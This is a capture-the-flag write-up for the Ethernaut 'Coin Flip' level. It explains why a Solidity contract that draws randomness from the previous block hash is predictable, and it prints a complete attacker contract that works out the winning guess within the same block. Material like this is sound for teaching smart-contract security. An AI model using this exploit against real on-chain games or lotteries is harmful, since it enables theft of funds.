---
layout: writeup
title: "Coin Flip"
level: "Intermediate"
category: "Ethernaut"
description: "Exploit pseudo-randomness in Solidity by predicting the outcome of a coin flip using an attacker contract."
---

## Analysis

The `CoinFlip` contract relies on the block hash of the previous block to generate a "random" number. In blockchain, this is **deterministic**—meaning if you can calculate the value in the same block, you can predict the result with 100% accuracy.

**The Flaw:**  
The contract uses `uint256(blockhash(block.number - 1))` as the source of randomness. Since an attacker contract can call the target contract in the same block, both will see the exact same `block.number - 1` and therefore the same "random" result.

---

## Solution

To solve this, you must deploy your own "Attacker" contract that performs the exact same math as the victim contract and then calls the `flip()` function with the "correct" guess.

---

## Attacker Contract (Solidity)

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public target;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }
}
</code></pre>

---
